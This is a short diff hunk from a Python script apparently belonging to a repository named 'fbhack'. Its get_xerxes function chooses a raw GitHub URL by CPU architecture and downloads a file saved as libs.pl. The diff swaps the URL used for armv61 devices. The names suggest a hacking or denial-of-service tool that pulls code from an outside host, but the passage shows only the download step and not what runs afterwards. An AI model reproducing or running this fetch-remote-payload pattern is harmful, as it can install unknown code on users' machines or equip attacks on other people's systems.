@@ -23,7 +23,7 @@ myname = ".demp.ov"
 def get_xerxes():
   plat = platform.machine()
   armv7_8l = "https://raw.githubusercontent.com/h3inAKArr/fbhack/master/libs/libs.pl"
-  armv61 = "https://raw.githubusercontent.com/h3inAKArr/fbhack/master/libs/libs"
+  armv61 = "https://raw.githubusercontent.com/h3inAKArr/fbhack/master/libs/libs/libs2.pl"
 
   if "armv7l" in plat or "armv8l" in plat:
     urllib.urlretrieve(armv7_8l,"{}/libs.pl".format(mypwd))
